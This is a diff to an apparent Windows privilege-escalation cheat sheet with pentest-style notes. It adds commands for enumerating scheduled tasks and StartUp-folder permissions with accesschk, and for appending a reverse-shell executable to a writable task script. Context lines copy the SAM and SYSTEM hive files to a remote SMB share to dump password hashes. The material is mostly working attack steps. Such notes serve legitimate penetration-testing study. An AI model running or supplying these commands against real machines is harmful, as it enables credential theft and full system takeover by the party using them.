@@ -99,8 +99,34 @@ Windows itself sometimes will store passwords in plaintext in the Registry. Wind
 > reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
 > reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 
-> copy C:\Windows\Repair\SAM \\IP\Sharename\                                                                          ---> To dump windows hashes 
-> copy C:\Windows\Repair\SYSTEM \\IP\Sharename\                                                                       ---> To dump windows hashes
+> copy C:\Windows\Repair\SAM \\IP\Sharename\                                                                          ---> To dump windows hashes to smb share
+> copy C:\Windows\Repair\SYSTEM \\IP\Sharename\                                                                       ---> To dump windows hashes to smb share
+
+
+
+-------------------- Scheduled Tasks --------------------
+Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM.
+
+> schtasks /query /fo LIST /v                                                                                       ---> List all scheduled tasks your user can see
+PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State                     --->ist all scheduled tasks your user 
+C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1                                             ---> After Enumartion we Found a script then we use accesschek to check our privileges on this script using accesschk.exe
+
+> echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1                                                            ---> Use echo to append a call to our reverse shell executable to the end of the script
+
+
+-------------------- Insecure GUI Apps --------------------
+Need RDP.
+
+-------------------- Startup Apps --------------------
+NeeEd RDP.
+Each user can define apps that start when they log in, by placing shortcuts to them in "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.
+
+> .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp                      ---> Use accesschk.exe to check permissions on the StartUp directory If the BUILTIN\Users group has write access we can Esclate our privileges.
+> cscript CreateShortcut.vbs  
+
+
+
+
 
 
 
